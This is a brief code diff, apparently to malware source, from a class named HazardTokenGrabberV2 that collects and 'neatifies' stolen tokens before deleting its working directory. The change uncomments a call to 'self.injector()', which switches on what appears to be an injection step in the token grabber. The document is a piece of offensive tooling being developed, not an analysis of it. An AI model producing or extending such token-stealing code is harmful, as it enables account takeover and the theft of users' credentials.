@@ -184,7 +184,7 @@ class HazardTokenGrabberV2(Functions):
             except RuntimeError:
                 continue
         self.neatifyTokens()
-        # await self.injector()
+        await self.injector()
         self.finish()
         shutil.rmtree(self.dir)
 
